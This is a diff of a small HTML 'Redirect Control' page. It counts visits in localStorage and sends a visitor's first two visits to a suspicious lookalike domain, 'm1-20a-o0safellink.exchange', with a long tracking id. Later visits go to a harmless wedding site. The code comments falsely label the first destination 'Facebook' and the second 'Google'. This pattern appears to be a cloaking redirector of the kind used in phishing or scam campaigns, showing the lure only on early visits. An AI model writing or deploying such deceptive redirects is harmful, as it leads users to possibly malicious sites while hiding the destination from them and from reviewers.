@@ -5,29 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirect Control</title>
     <script>
-        // Editable maximum number of redirects
-        const maxRedirects = 1; // Edit this number as needed
+        // Editable maximum number of redirects to Facebook
+        const maxRedirectsToFacebook = 2;
 
         // Get the current count of redirects from localStorage
         let redirectCount = parseInt(localStorage.getItem('redirectCount')) || 0;
 
         // Check if the redirect count exceeds the limit
-        if (redirectCount < maxRedirects) {
+        if (redirectCount < maxRedirectsToFacebook) {
             // Increment and store the new count
             redirectCount++;
             localStorage.setItem('redirectCount', redirectCount);
 
+            // Redirect to Facebook
             window.location.href = "https://m1-20a-o0safellink.exchange/90298365256387386538763933";
         } else {
-            // Display a message when the limit is reached
-            document.addEventListener("DOMContentLoaded", () => {
-                document.getElementById('message').textContent =
-                    "You have reached the maximum number of allowed redirects.";
-            });
+            // Redirect to Google after the limit is reached
+            window.location.href = "https://www.bridebook.com";
         }
     </script>
 </head>
 <body>
-
+    <h1>Redirect Control</h1>
+    <p id="message">Redirecting...</p>
+    <p>To change the redirect limit, edit the `maxRedirectsToFacebook` value in this HTML file.</p>
+</body>
 </html>
 
